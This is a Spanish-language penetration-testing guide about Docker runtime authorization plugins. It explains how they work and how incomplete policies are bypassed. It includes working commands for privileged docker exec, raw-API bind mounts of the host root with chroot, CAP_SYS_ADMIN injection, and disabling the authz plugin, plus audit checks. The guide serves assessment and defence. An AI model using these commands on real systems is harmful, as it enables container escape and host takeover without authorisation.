# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los runtime authorization plugins son una capa de políticas adicional que decide si un caller puede realizar una acción determinada del daemon. Docker es el ejemplo clásico. Por defecto, cualquiera que pueda comunicarse con el daemon de Docker tiene, en la práctica, un amplio control sobre él. Los authorization plugins intentan limitar este modelo examinando la identidad del usuario autenticado y la operación de API solicitada, y permitiendo o denegando la solicitud según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una Docker API o a un usuario del grupo `docker`. En estos entornos, la pregunta ya no es únicamente «¿puedo alcanzar el daemon?», sino también «¿el daemon está protegido por una authorization layer y, si es así, se puede bypass mediante endpoints no gestionados, un análisis JSON débil o permisos de plugin-management?».

## Funcionamiento

Cuando una solicitud llega al daemon de Docker, el authorization subsystem puede pasar el contexto de la solicitud a uno o más plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la solicitud, determinados headers y partes del body de la solicitud o de la respuesta cuando el content type es adecuado. Se pueden encadenar varios plugins, y el acceso solo se concede si todos los plugins permiten la solicitud.

Este modelo parece sólido, pero su seguridad depende completamente de hasta qué punto el autor de la política comprendió la API. Un plugin que bloquea `docker run --privileged` pero ignora `docker exec`, omite claves JSON alternativas como `Binds` en el nivel superior o permite la administración de plugins puede crear una falsa sensación de restricción y, aun así, dejar abiertas rutas directas de privilege escalation.

## Objetivos habituales de los plugins

Las áreas importantes que deben revisarse en una política son:

- endpoints de creación de contenedores
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` y las opciones de uso compartido de namespaces
- comportamiento de `docker exec`
- endpoints de plugin management
- cualquier endpoint que pueda activar indirectamente runtime actions fuera del modelo de políticas previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos sencillos como `authobot` facilitaron el estudio de este modelo, porque sus archivos de políticas y rutas de código mostraban cómo se implementaba realmente el mapeo entre endpoints y acciones. Para los trabajos de assessment, la lección importante es que el autor de la política debe comprender toda la superficie de la API, no solo los comandos de CLI más visibles.

## Abuso

El primer objetivo es averiguar qué está bloqueado realmente. Si el daemon deniega una acción, el error suele hacer leak del nombre del plugin, lo que ayuda a identificar el control utilizado:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si necesitas un perfilado más amplio de endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea, normalmente repetitiva, de comprobar qué rutas de API y estructuras JSON están realmente permitidas por el plugin.

Si el entorno utiliza un plugin personalizado y puedes interactuar con la API, enumera qué campos de objeto se filtran realmente:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Estas comprobaciones son importantes porque muchos fallos de autorización son específicos de un campo y no de un concepto. Un plugin puede rechazar un patrón de CLI sin bloquear completamente la estructura de API equivalente.

### Ejemplo completo: `docker exec` añade privilegios después de crear el contenedor

Una policy que bloquea la creación de contenedores privilegiados, pero permite crear contenedores unconfined y usar `docker exec`, aún puede eludirse:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si el daemon acepta el segundo paso, el usuario ha recuperado un proceso interactivo con privilegios dentro de un contenedor que el autor de la policy creía restringido.

### Ejemplo completo: Bind Mount mediante Raw API

Algunas policies defectuosas inspeccionan únicamente una forma de JSON. Si el bind mount del sistema de archivos root no se bloquea de manera coherente, el host aún puede montarse:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La misma idea también puede aparecer en `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
El impacto es un escape completo del sistema de archivos del host. El detalle interesante es que el bypass proviene de una cobertura incompleta de la política, no de un bug del kernel.

### Ejemplo completo: atributo de capability sin comprobar

Si la política olvida filtrar un atributo relacionado con una capability, el atacante puede crear un container que recupere una capability peligrosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una vez que `CAP_SYS_ADMIN` o una capability de fuerza similar está presente, muchas técnicas de breakout descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md) pasan a estar disponibles.

### Ejemplo completo: deshabilitar el plugin

Si las operaciones de gestión de plugins están permitidas, el bypass más limpio puede ser desactivar completamente el control:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Este es un fallo de la policy a nivel del control plane. La capa de autorización existe, pero el usuario al que debía restringir todavía conserva permisos para deshabilitarla.

## Comprobaciones

Estos comandos tienen como objetivo identificar si existe una capa de policy y si parece completa o superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Qué es interesante aquí:

- Los mensajes de denegación que incluyen el nombre de un plugin confirman la existencia de una capa de autorización y a menudo revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede ser suficiente para descubrir si es posible deshabilitar o reconfigurar operaciones.
- Una policy que bloquea únicamente acciones CLI obvias, pero no solicitudes API directas, debe considerarse evadible hasta que se demuestre lo contrario.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | No habilitado de forma predeterminada | El acceso al daemon es, en la práctica, total o nulo, a menos que se configure un plugin de autorización | policy de plugin incompleta, blacklists en lugar de allowlists, permitir la gestión de plugins, puntos ciegos a nivel de campos |
| Podman | No existe un equivalente directo común | Podman normalmente depende más de los permisos de Unix, la ejecución rootless y las decisiones sobre la exposición de la API que de plugins de autorización al estilo de Docker | exponer ampliamente una API de Podman rootful, permisos débiles del socket |
| containerd / CRI-O | Modelo de control diferente | Estos runtimes normalmente dependen de los permisos del socket, los límites de confianza del nodo y los controles del orquestador en capas superiores, en lugar de plugins de autorización de Docker | montar el socket en workloads, suposiciones débiles sobre la confianza local del nodo |
| Kubernetes | Usa authn/authz en las capas del API-server y kubelet, no plugins de autorización de Docker | El RBAC del clúster y los controles de admisión son la principal capa de policy | RBAC demasiado permisivo, policy de admisión débil, exponer directamente las APIs de kubelet o del runtime |
{{#include ../../../banners/hacktricks-training.md}}
